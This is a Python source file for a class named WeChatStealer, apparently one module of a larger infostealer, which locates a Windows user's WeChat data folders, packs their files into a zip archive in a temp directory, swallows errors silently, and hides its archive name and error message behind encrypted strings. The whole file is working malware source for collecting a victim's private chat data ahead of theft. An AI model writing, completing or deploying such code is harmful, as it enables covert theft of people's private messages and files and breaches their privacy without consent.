import os
import shutil
import zipfile
import time
from core.obfuscation import decrypt_string
class WeChatStealer:
    def __init__(self, temp_dir):
        self.temp_dir = temp_dir
        self.user_profile = os.path.expanduser('~')
        self.wechat_paths = [
            os.path.join(self.user_profile, 'Documents', 'WeChat Files'),
            os.path.join(self.user_profile, 'AppData', 'Roaming', 'Tencent', 'WeChat'),
            os.path.join(self.user_profile, 'AppData', 'Local', 'Tencent', 'WeChat')
        ]
    def steal_data(self):
        result = {'found': False, 'size_mb': 0.0, 'zip_path': None}
        found_path = None
        for path in self.wechat_paths:
            if os.path.exists(path):
                try:
                    items = os.listdir(path)
                    if any("wxid_" in p for p in items) or "All Users" in items:
                        found_path = path
                        break
                except Exception:
                    pass
        if not found_path:
            return result
        try:
            zip_path = os.path.join(self.temp_dir, decrypt_string("GVcbAy8lBhkzGR4QBlALH0BGEQYreXBLJ1kQUQI="))
            total_size_val: int = 0
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(str(found_path)):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            fsize = int(os.path.getsize(file_path))
                            if fsize > 20 * 1024 * 1024:  
                                continue
                            if (total_size_val + fsize) > 100 * 1024 * 1024:  
                                break
                            arcname = os.path.relpath(file_path, os.path.dirname(str(found_path)))
                            zipf.write(file_path, arcname)
                            total_size_val += fsize 
                        except Exception:
                            pass
                    if total_size_val > 100 * 1024 * 1024:
                        break
            final_size: int = int(total_size_val)
            if os.path.exists(zip_path):
                result['found'] = True
                result['size_mb'] = float(final_size) / (1024.0 * 1024.0)
                result['zip_path'] = str(zip_path)
        except Exception as e:
            print(decrypt_string("NRMlSxk0Ggo7A0pdAEsJCFQSAw4z"))
        return result